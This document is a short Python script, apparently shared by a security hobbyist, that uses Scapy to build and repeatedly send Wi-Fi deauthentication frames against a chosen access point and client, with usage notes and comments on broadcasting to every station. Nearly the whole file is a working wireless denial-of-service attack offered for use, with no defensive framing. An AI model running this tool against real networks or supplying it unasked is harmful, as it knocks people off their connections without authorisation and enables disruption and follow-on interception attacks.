#!/usr/bin/env python
# Scapy based wifi Deauth by @catalyst256
# Change the client to FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point

import sys
if len(sys.argv) != 5:
    print 'Usage is ./scapy-deauth.py interface bssid client count'
    print 'Example - ./scapy-deauth.py mon0 00:11:22:33:44:55 55:44:33:22:11:00 50'
    sys.exit(1)

from scapy.all import *

conf.iface = sys.argv[1] # The interface that you want to send packets out of, needs to be set to monitor mode
bssid = sys.argv[2] # The BSSID of the Wireless Access Point you want to target
client = sys.argv[3] # The MAC address of the Client you want to kick off the Access Point
count = sys.argv[4] # The number of deauth packets you want to send

conf.verb = 0

packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)

for n in range(int(count)):
    sendp(packet)
    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client

